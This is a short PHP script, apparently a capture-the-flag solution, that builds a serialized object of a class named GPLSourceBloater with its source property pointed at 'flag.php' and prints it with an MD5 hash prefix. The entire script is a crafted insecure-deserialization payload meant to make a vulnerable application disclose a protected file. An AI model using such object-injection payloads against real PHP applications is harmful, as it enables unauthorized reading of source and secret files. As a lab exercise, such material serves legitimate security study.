<?php
Class GPLSourceBloater{
		public $source;
			
				public function __construct(){
							$this->source = "flag.php";
								}
}

$m = serialize(new GPLSourceBloater());
$h = md5($m);
echo $h.$m;
